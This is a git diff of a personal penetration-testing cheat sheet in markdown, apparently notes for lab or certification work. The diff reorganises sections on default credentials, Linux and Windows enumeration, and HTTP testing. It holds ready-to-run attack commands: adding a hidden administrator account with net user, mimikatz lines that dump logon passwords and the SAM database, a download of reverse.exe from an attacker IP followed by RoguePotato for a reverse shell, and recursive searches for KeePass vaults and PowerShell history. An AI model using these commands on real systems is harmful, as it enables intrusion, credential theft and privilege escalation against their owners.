@@ -7,28 +7,26 @@ root:root
 root:password
 root:null
 platform:platform
+foundusername:foundusername
 ```
 
-# kill process on a port
-```bash
-fuser -k 8080/tcp
-```
+# PDF files
+- exiftool to find username and use same usernames for password
+- read contents on windows
 
 # Linux
-Find all directories which can be written to by current user:
+## Find all directories which can be written to by current user:
 ```bash
 $ find / -executable -writable -type d 2> /dev/null
 ```
 
+## kill process on a port
+```bash
+fuser -k 8080/tcp
+```
+
 
 # Windows
-
-## Add user
-```bash
-> net user nuri password123! /add
-> net localgroup administrators nuri /add
-
-```
 
 ## Enumeration
 ```bash
@@ -82,9 +80,6 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 > Restart-Service service
 
 
-
-
-
 # Search for juicy files
 > type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 > type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -93,8 +88,16 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 > Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig -File -Recurse -ErrorAction SilentlyContinue
+> Check every user's directory && desktop && documents
+```
+
+## Add user
+```bash
+> net user nuri password123! /add
+> net localgroup administrators nuri /add
 
 ```
+
 
 ## crackmapexec
 ```bash
@@ -132,7 +135,6 @@ privilege::debug
 token::elevate
 sekurlsa::logonpasswords
 lsadump::sam
-
 ```
 
 
@@ -163,7 +165,6 @@ iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
 .\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
 ```
 
-
 ## GodPotato
 ```bash
 Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
@@ -173,6 +174,12 @@ Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
 ```
 
 # HTTP/HTTPS(80,8080,8000,443...)
+## HTTP Checklist
+- Local File Inclusion (ex. http://192.168.249.12/index.php?page=somepage.php)
+- File Traversal (ex. id_rsa?)
+- Find cms and its version?
+- SQLi?
+
 
 ## hydra
 ```bash
